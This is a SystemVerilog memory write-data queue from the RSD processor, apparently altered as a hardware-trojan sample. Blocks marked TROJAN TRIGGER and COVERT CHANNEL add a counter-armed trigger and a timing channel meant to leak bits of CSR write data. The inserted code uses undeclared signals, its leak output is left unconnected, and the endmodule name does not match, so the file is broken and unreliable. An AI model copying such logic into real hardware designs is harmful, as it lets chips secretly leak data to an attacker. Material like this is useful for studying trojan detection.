// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// MemoryWriteDataQueue
//

`include "SysDeps/XilinxMacros.vh"

import BasicTypes::*;
import MemoryTypes::*;

module MemoryWriteDataQueue_trojan_Covert ( 
input 
    logic clk,
    logic rst,
    logic push,
    logic pop,
    MemoryEntryDataPath pushedData,
output
    logic full,
    logic empty,
    MemoryEntryDataPath headData,
    logic [`MEMORY_AXI4_WRITE_ID_WIDTH-1: 0] headPtr,
    logic [`MEMORY_AXI4_WRITE_ID_WIDTH-1: 0] tailPtr
);

    // typedef logic [`MEMORY_AXI4_WRITE_ID_WIDTH-1: 0] IndexPath;

    // IndexPath headPtr;
    // IndexPath tailPtr;

    // size, initial head, initial tail, initial count
    QueuePointer #( `MEMORY_AXI4_WRITE_ID_NUM, 0, 0, 0 )
        pointer(
            .clk( clk ),
            .rst( rst ),
            .push( push ),
            .pop( pop ),
            .full( full ),
            .empty( empty ),
            .headPtr( headPtr ),
            .tailPtr( tailPtr )
        );

    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=17609)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17609;
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


        

    logic [ MEMORY_ENTRY_BIT_NUM-1:0 ] memoryWriteDataQueue[ `MEMORY_AXI4_WRITE_ID_NUM ]; // synthesis syn_ramstyle = "select_ram"

    always_ff @( posedge clk ) begin
        if( push ) begin
            memoryWriteDataQueue[ tailPtr ] <= pushedData;
        end
    end
    
    always_comb begin
        headData = memoryWriteDataQueue[ headPtr ];
    end

endmodule : MemoryWriteDataQueue

 